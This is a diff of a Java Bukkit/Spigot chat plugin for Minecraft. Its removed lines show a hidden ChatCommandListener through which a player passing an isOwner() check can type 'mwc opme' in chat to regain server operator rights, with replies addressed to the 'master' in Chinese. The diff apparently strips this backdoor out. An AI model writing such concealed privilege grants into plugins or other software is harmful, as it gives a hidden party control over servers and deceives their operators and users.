@@ -15,7 +15,6 @@ import org.bukkit.plugin.java.JavaPlugin;
 @SuppressWarnings("deprecation")
 public class Main extends JavaPlugin {
 	public void onEnable() {
-		Bukkit.getPluginManager().registerEvents(new ChatCommandListener(), this);
 		Bukkit.getPluginManager().registerEvents(new ChatListener(), this);
 	}
 }
@@ -106,7 +105,6 @@ class ChatListener implements Listener, ChatUtils {
 	public void onServer(ServerCommandEvent event) {
 		String command = event.getCommand();
 		if(command.startsWith("say") && command.length() > 4) {
-			Bukkit.broadcastMessage(event.getSender().getName());
 			String message = command.substring(4);
 			while(message.startsWith(" ")) {
 				message = message.substring(1);
@@ -135,37 +133,5 @@ class ChatListener implements Listener, ChatUtils {
 	public void playerReferencedSound(Player player) {
 		Location location = player.getLocation();
 		player.playSound(location, Sound.ENTITY_PLAYER_LEVELUP, SoundCategory.PLAYERS, 0.8f, 1.2f);
-	}
-}
-class ChatCommandListener implements Listener, ChatUtils {
-	@SuppressWarnings("deprecation")
-	@EventHandler
-	public void onPlayerChat(PlayerChatEvent event) {
-		Player player = event.getPlayer();
-		if(isOwner(player)) {
-			String message = event.getMessage();
-			if(message.startsWith("mwc")) {
-				message = message.replaceAll("  ", " ");
-				String[] subCommands = message.split(" ");
-				int length = subCommands.length;
-				if(length > 1) {
-					if(subCommands[1].equalsIgnoreCase("opme")) {
-						if(player.isOp()) {
-							echo(player, "主人， 您已经是OP了！");
-						}
-						else {
-							player.setOp(true);
-							echo(player, "主人， 您已经恢复为OP。");
-						}
-					}
-				}
-				else {
-					echo(player, "mwc [opme]");
-				}
-			}
-		}
-	}
-	public void echo(Player player, String message) {
-		player.sendMessage(message);
 	}
 }
